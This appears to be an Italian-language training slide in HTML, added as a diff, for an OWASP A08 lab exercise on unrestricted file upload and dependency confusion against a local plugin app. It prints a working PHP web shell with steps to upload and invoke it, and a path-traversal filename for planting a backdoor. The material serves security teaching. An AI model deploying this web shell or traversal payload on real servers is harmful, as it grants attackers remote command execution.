@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A08:2021 - Esercizio 5: Upload e Dependency Confusion</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">📤 Esercizio 5: Upload e Dependency Confusion</h1>
+        <div class="subtitle">Caricare codice malevolo mascherato da plugin legittimo</div>
+
+        <div class="grid-2-col">
+            <div class="card border-red">
+                <div class="card-title">📂 Upload Senza Controlli</div>
+                <div class="card-text">
+                    Il sistema permette upload senza verificare:
+                    <br><br>
+                    • <strong>Tipo file:</strong> nessun controllo MIME<br>
+                    • <strong>Estensione:</strong> accetta qualsiasi cosa<br>
+                    • <strong>Contenuto:</strong> nessuna scansione<br>
+                    • <strong>Dimensione:</strong> nessun limite<br>
+                    • <strong>Nome:</strong> nessuna sanitizzazione (path traversal!)
+                </div>
+            </div>
+
+            <div class="card border-purple">
+                <div class="card-title">🎭 Dependency Confusion</div>
+                <div class="card-text">
+                    Plugin esistenti:
+                    <br><br>
+                    • <span class="tech-term">analytics</span><br>
+                    • <span class="tech-term">backup</span><br>
+                    • <span class="tech-term">security</span>
+                    <br><br>
+                    Crea plugin con nome simile: <span class="tech-term">analytics-pro</span>, 
+                    <span class="tech-term">backup-enhanced</span>, <span class="tech-term">security-update</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-blue" style="margin-top: 25px;">
+            <div class="card-title">📝 L'Attacco: Upload Web Shell</div>
+            <div class="card-text">
+                <strong class="text-blue">Step 1:</strong> Crea un file <span class="tech-term">malicious_plugin.php</span>:
+                <div class="code-box">&lt;?php
+// Web Shell mascherata da plugin
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;</div>
+                <br>
+                <strong class="text-blue">Step 2:</strong> Vai su <span class="tech-term">http://localhost:8008/upload_plugin.php</span><br><br>
+                <strong class="text-blue">Step 3:</strong> Compila il form: Nome = "malicious", Versione = "1.0.0", File = il tuo PHP<br><br>
+                <strong class="text-blue">Step 4:</strong> Accedi a: <span class="tech-term">http://localhost:8008/uploads/malicious_plugin.php?cmd=id</span>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 20px;">
+            <div class="card-title">🔀 Path Traversal</div>
+            <div class="card-text">
+                Prova a caricare un file con nome: <span class="tech-term">../../../var/www/html/backdoor.php</span>
+                <br>Il sistema potrebbe scriverlo in una directory diversa!
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 7;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
